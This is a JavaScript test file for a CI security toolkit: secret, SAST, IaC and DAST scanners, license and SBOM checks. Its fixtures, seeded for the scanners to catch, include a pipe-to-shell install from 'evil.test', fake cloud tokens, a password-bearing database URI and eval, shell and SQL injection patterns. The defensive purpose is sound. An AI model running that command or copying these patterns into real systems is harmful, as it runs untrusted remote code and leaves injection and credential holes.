import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { collectNormalizedArtifacts } from '../ci/collect-ci-findings.mjs';
import { buildSarifReport, loadSecurityPolicy, redactSecretValue } from './common.mjs';
import { evaluateSpdxExpression } from './check-licenses.mjs';
import { buildCycloneDxBom, buildPackageUrl, parseSriHash } from './generate-sbom.mjs';
import { analyzeDastProbeResults, validateTargetUrl } from './run-dast.mjs';
import { computeSlaDueDate, evaluateAuditReport, evaluateWaivers } from './scan-dependencies.mjs';
import { scanCompose, scanDockerfile, scanKubernetes, scanTerraform } from './scan-iac.mjs';
import { scanSourceForSast } from './scan-sast.mjs';
import { scanTextForSecrets } from './scan-secrets.mjs';

const policy = loadSecurityPolicy();

describe('15.2.1 Secret Scanning (scan-secrets.mjs)', () => {
  it('detects real-looking secrets and redacts values in findings', () => {
    const fakeAws = 'AKIA' + '9K7M2P4Q8R3T6V1W';
    const fakeGh = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';
    const fakeDb = 'postgresql://admin:Sup3rS3cr3tP4ss!@db.internal:5432/app';
    const sample = [
      `const aws = "${fakeAws}";`,
      `const gh = "${fakeGh}";`,
      `const db = "${fakeDb}";`,
      '-----BEGIN RSA PRIVATE KEY-----',
    ].join('\n');

    const findings = scanTextForSecrets(sample, 'backend/src/config/bad.ts', policy);
    assert.equal(findings.length, 4);
    assert.ok(findings.some((f) => f.rule === 'SECRET-AWS-ACCESS-KEY'));
    assert.ok(findings.some((f) => f.rule === 'SECRET-GITHUB-TOKEN'));
    assert.ok(findings.some((f) => f.rule === 'SECRET-DB-URI-CREDENTIAL'));
    assert.ok(findings.some((f) => f.rule === 'SECRET-PRIVATE-KEY'));
    // Không bao giờ lộ raw secret vào message
    assert.ok(!findings.some((f) => f.message.includes(fakeGh)));
    assert.equal(redactSecretValue('abcdefgh12345678'), 'abcd****5678');
  });

  it('respects .env.example allowlist and inline secret-scan-ok marker', () => {
    const fakeGh = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';
    assert.equal(scanTextForSecrets(`TOKEN=${fakeGh}`, '.env.docker.prod.example', policy).length, 0);
    assert.equal(
      scanTextForSecrets(`const x = "${fakeGh}"; // secret-scan-ok`, 'backend/src/demo.ts', policy).length,
      0,
    );
  });
});

describe('15.2.2 Dependency Audit & SLA Policy (scan-dependencies.mjs)', () => {
  it('computes SLA due dates by severity and enforces fail/warn thresholds', () => {
    const refDate = new Date('2026-11-27T00:00:00.000Z');
    assert.deepEqual(computeSlaDueDate('critical', policy.dependencyAudit.slaDays, refDate), {
      slaDays: 1,
      slaDueDate: '2026-11-28',
    });
    assert.deepEqual(computeSlaDueDate('high', policy.dependencyAudit.slaDays, refDate), {
      slaDays: 7,
      slaDueDate: '2026-12-04',
    });

    const mockAudit = {
      vulnerabilities: {
        'bad-high-pkg': {
          severity: 'high',
          isDirect: true,
          range: '<2.0.0',
          fixAvailable: { name: 'bad-high-pkg', version: '2.0.0', isSemVerMajor: true },
          via: [{ source: 1099001, title: 'Prototype Pollution', severity: 'high', url: 'https://advisory.test/1' }],
        },
        'warn-mod-pkg': {
          severity: 'moderate',
          isDirect: true,
          range: '<1.5.0',
          fixAvailable: true,
          via: [{ source: 1099002, title: 'ReDoS', severity: 'moderate', url: 'https://advisory.test/2' }],
        },
      },
    };

    const findings = evaluateAuditReport('backend', 'backend', mockAudit, policy, refDate);
    assert.equal(findings.length, 2);
    const highFinding = findings.find((f) => f.package === 'bad-high-pkg');
    const modFinding = findings.find((f) => f.package === 'warn-mod-pkg');
    assert.equal(highFinding.status, 'FAIL');
    assert.equal(highFinding.slaDueDate, '2026-12-04');
    assert.equal(modFinding.status, 'WARN');
    assert.equal(modFinding.slaDays, 30);
  });

  it('distinguishes active waivers from expired waivers', () => {
    const refDate = new Date('2026-11-27T00:00:00.000Z');
    const { active, expired } = evaluateWaivers(
      [
        { id: '1001', package: 'pkg-a', expiresAt: '2026-12-31' },
        { id: '1002', package: 'pkg-b', expiresAt: '2026-10-01' },
      ],
      refDate,
    );
    assert.equal(active.has('1001'), true);
    assert.equal(expired.length, 1);
    assert.equal(expired[0].id, '1002');
  });
});

describe('15.2.3 SAST Source Scanning (scan-sast.mjs)', () => {
  it('flags common OWASP anti-patterns and honors sast-ok comment', () => {
    const code = [
      'const out = eval(userInput);',
      'execSync(`ls ${dir}`);',
      'await db.query(`SELECT * FROM users WHERE id = ${id}`);',
      'const el = { dangerouslySetInnerHTML: { __html: raw } };',
      'const agent = { rejectUnauthorized: false };',
      'const h = crypto.createHash("md5").update(x).digest("hex");',
      'const redisRes = await client.eval(LUA_SCRIPT, 1, key);',
      'const safe = eval("1+1"); // sast-ok: test',
    ].join('\n');

    const findings = scanSourceForSast(code, 'backend/src/modules/demo/vuln.service.ts', policy);
    const rules = findings.map((f) => f.rule);
    assert.ok(rules.includes('SAST-CODE-INJECTION-EVAL'));
    assert.ok(rules.includes('SAST-CMD-INJECTION-SHELL'));
    assert.ok(rules.includes('SAST-SQL-RAW-INTERPOLATION'));
    assert.ok(rules.includes('SAST-XSS-DANGEROUS-HTML'));
    assert.ok(rules.includes('SAST-TLS-VERIFY-DISABLED'));
    assert.ok(rules.includes('SAST-WEAK-HASH-CRYPTO'));
    assert.equal(findings.filter((f) => f.rule === 'SAST-CODE-INJECTION-EVAL').length, 1);
  });
});

describe('15.2.5 IaC Security Scanning (scan-iac.mjs)', () => {
  it('detects misconfigurations in Dockerfile, Compose, Kubernetes and Terraform', () => {
    const dfFindings = scanDockerfile(
      [
        'FROM node:latest',
        'ENV DB_PASSWORD=supersecretpassword123',
        'RUN curl -sSL https://evil.test/install.sh | sh',
        'RUN chmod 777 /app',
        'USER root',
      ].join('\n'),
      'docker/backend/Dockerfile.prod',
      policy,
    );
    assert.ok(dfFindings.some((f) => f.rule === 'IAC-DOCKER-HARDCODED-SECRET'));
    assert.ok(dfFindings.some((f) => f.rule === 'IAC-DOCKER-PIPE-TO-SHELL'));
    assert.ok(dfFindings.some((f) => f.rule === 'IAC-DOCKER-CHMOD-777'));
    assert.ok(dfFindings.some((f) => f.rule === 'IAC-DOCKER-ROOT-USER'));

    const composeFindings = scanCompose(
      'services:\n  app:\n    image: app:latest\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n',
      'docker-compose.prod.yml',
      policy,
    );
    assert.ok(composeFindings.some((f) => f.rule === 'IAC-COMPOSE-PRIVILEGED'));
    assert.ok(composeFindings.some((f) => f.rule === 'IAC-COMPOSE-DOCKER-SOCKET'));
    assert.ok(composeFindings.some((f) => f.rule === 'IAC-COMPOSE-LATEST-IMAGE'));

    const k8sFindings = scanKubernetes(
      'spec:\n  hostNetwork: true\n  containers:\n    - securityContext:\n        runAsUser: 0\n',
      'deploy/k8s/bad-deploy.yaml',
      policy,
    );
    assert.ok(k8sFindings.some((f) => f.rule === 'IAC-K8S-HOST-NAMESPACE'));
    assert.ok(k8sFindings.some((f) => f.rule === 'IAC-K8S-ROOT-ESCALATION'));

    const tfFindings = scanTerraform(
      'resource "aws_s3_bucket" "b" {\n  acl = "public-read"\n}\nresource "aws_db_instance" "db" {\n  storage_encrypted = false\n  cidr_blocks = ["0.0.0.0/0"] # port 5432\n}\n',
      'infra/main.tf',
      policy,
    );
    assert.ok(tfFindings.some((f) => f.rule === 'IAC-TF-PUBLIC-STORAGE'));
    assert.ok(tfFindings.some((f) => f.rule === 'IAC-TF-UNENCRYPTED-STORAGE'));
    assert.ok(tfFindings.some((f) => f.rule === 'IAC-TF-OPEN-ADMIN-PORT'));
  });
});

describe('15.2.6 License Compliance (check-licenses.mjs)', () => {
  it('evaluates single, OR, AND and copyleft SPDX expressions correctly', () => {
    assert.equal(evaluateSpdxExpression('MIT', policy.licenses).decision, 'ALLOW');
    assert.equal(evaluateSpdxExpression('Apache-2.0', policy.licenses).decision, 'ALLOW');
    assert.equal(evaluateSpdxExpression('(MIT OR GPL-3.0-only)', policy.licenses).decision, 'ALLOW');
    assert.equal(evaluateSpdxExpression('GPL-3.0-only', policy.licenses).decision, 'DENY');
    assert.equal(evaluateSpdxExpression('AGPL-3.0-or-later', policy.licenses).decision, 'DENY');
    assert.equal(evaluateSpdxExpression('MIT AND GPL-3.0', policy.licenses).decision, 'DENY');
    assert.equal(evaluateSpdxExpression('LGPL-3.0', policy.licenses).decision, 'WARN');
    assert.equal(evaluateSpdxExpression('UNKNOWN', policy.licenses).decision, 'WARN');
  });
});

describe('15.2.7 CycloneDX 1.5 SBOM Generator (generate-sbom.mjs)', () => {
  it('parses SRI integrity hashes, builds PURLs and outputs valid CycloneDX 1.5 JSON', () => {
    const hashes = parseSriHash('sha512-AAAA');
    assert.equal(hashes.length, 1);
    assert.equal(hashes[0].alg, 'SHA-512');
    assert.equal(buildPackageUrl('@nestjs/common', '11.0.0'), 'pkg:npm/%40nestjs/common@11.0.0');

    const bom = buildCycloneDxBom({
      appName: 'core-workspace',
      appVersion: '1.2.3',
      gitCommit: 'abcdef123456',
      gitBranch: 'main',
      components: [{ type: 'library', 'bom-ref': 'pkg:npm/zod@4.4.3', name: 'zod', version: '4.4.3', purl: 'pkg:npm/zod@4.4.3' }],
      directRefs: ['pkg:npm/zod@4.4.3'],
    });

    assert.equal(bom.bomFormat, 'CycloneDX');
    assert.equal(bom.specVersion, '1.5');
    assert.ok(bom.serialNumber.startsWith('urn:uuid:'));
    assert.equal(bom.metadata.component.version, '1.2.3');
    assert.equal(bom.components.length, 1);
    assert.deepEqual(bom.dependencies[0].dependsOn, ['pkg:npm/zod@4.4.3']);
  });
});

describe('15.2.8 Staging DAST Safety Gate & Probes (run-dast.mjs)', () => {
  it('blocks production hosts and allows staging/local URLs', () => {
    assert.equal(validateTargetUrl('https://prod.example.org', policy).valid, false);
    assert.equal(validateTargetUrl('https://api.production.company.vn', policy).valid, false);
    assert.equal(validateTargetUrl('https://api.example.com', policy).valid, false);
    assert.equal(validateTargetUrl('https://unknown-external.org', policy).valid, false);

    assert.equal(validateTargetUrl('https://staging-api.company.vn', policy).valid, true);
    assert.equal(validateTargetUrl('http://127.0.0.1:3005', policy).valid, true);
  });

  it('detects CORS credential reflection, broken access control, stack trace leak and missing headers', () => {
    const findings = analyzeDastProbeResults(
      {
        health: { url: 'https://staging.core.local/api/v1/health', headers: { 'x-powered-by': 'Express' } },
        cors: {
          url: 'https://staging.core.local/api/v1/health',
          probeOrigin: 'https://evil-dast-probe.invalid',
          headers: {
            'access-control-allow-origin': 'https://evil-dast-probe.invalid',
            'access-control-allow-credentials': 'true',
          },
        },
        protectedEndpoints: [{ url: 'https://staging.core.local/api/v1/users', status: 200 }],
        errorLeak: { url: 'https://staging.core.local/api/v1/auth/login', body: 'QueryFailedError: SELECT * FROM users' },
        traceMethod: { url: 'https://staging.core.local/api/v1/health', status: 200 },
      },
      { protocol: 'https:', policy },
    );

    const rules = findings.map((f) => f.rule);
    assert.ok(rules.includes('DAST-CORS-CREDENTIAL-REFLECTION'));
    assert.ok(rules.includes('DAST-BROKEN-ACCESS-CONTROL'));
    assert.ok(rules.includes('DAST-ERROR-STACK-LEAK'));
    assert.ok(rules.includes('DAST-HTTP-TRACE-ENABLED'));
    assert.ok(rules.includes('DAST-SERVER-BANNER-LEAK'));
    assert.ok(rules.includes('DAST-HEADER-MISSING-X-CONTENT-TYPE-OPTIONS'));
  });
});

describe('SARIF 2.1.0 & CI Report Integration', () => {
  it('generates valid SARIF 2.1.0 and maps security findings into collectNormalizedArtifacts', () => {
    const finding = {
      rule: 'DEP-CVE:12345',
      severity: 'High',
      status: 'FAIL',
      file: 'backend/package-lock.json',
      line: 1,
      slaDays: 7,
      slaDueDate: '2026-12-04',
      message: 'Test CVE finding',
      remediation: 'Upgrade package',
    };
    const sarif = buildSarifReport({ toolName: 'core-test', findings: [finding] });
    assert.equal(sarif.version, '2.1.0');
    assert.equal(sarif.runs[0].results.length, 1);

    const { findings } = collectNormalizedArtifacts({
      securityDeps: { findings: [finding] },
    });
    assert.equal(findings.length, 1);
    assert.equal(findings[0].code, 'CVE-01');
    assert.equal(findings[0].gate, 'Security Dependency Audit');
    assert.ok(findings[0].evidence.includes('2026-12-04'));
  });
});
